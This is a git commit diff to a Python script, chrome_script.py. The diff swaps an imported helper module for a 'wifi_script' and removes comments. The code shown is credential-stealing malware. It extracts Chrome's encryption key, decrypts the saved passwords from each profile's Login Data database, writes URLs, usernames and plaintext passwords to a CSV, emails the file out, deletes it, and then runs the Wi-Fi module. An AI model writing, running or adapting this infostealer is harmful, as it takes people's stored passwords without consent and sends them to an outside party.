d2b756c54d1328500d5e64d33bd39b9262aedf9f
Mohit Dwivedi <118814602+DarkImpact1@users.noreply.github.com>
2024-07-11 16:49:07 +0530

    Update chrome_script.py

--- chrome_script.py
+++ chrome_script.py
@@ -12,7 +12,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
-import script1
+import wifi_script
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
@@ -68,19 +68,14 @@ def get_db_connection(chrome_path_login_db):
 
 def fetch_and_transfer():
     try:
-        # fetching username for the file name
         username =  os.getlogin()
         file_name = username+"_chrome_password.csv"
-        #Create Dataframe to store passwords
         with open(file_name, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
-            #(1) Get secret key
             secret_key = get_secret_key()
-            #Search user profile or default folder (this is where the encrypted login password is stored)
             folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
-            	#(2) Get ciphertext from sqlite database
                 chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                 conn = get_db_connection(chrome_path_login_db)
                 if(secret_key and conn):
@@ -91,18 +86,13 @@ def fetch_and_transfer():
                         username = login[1]
                         ciphertext = login[2]
                         if(url!="" and username!="" and ciphertext!=""):
-                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                            #(4) Use AES algorithm to decrypt the password
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            #(5) Save into CSV 
                             csv_writer.writerow([index,url,username,decrypted_password])
-                    #Close database connection
                     cursor.close()
                     conn.close()
-                    #Delete temp login db
                     os.remove("Loginvault.db")
         script1.send_email(file_name)
         os.remove(file_name)
-        script1.execute()
+        wifi_script.execute()
     except Exception as e:
         print("[ERR] %s"%str(e))
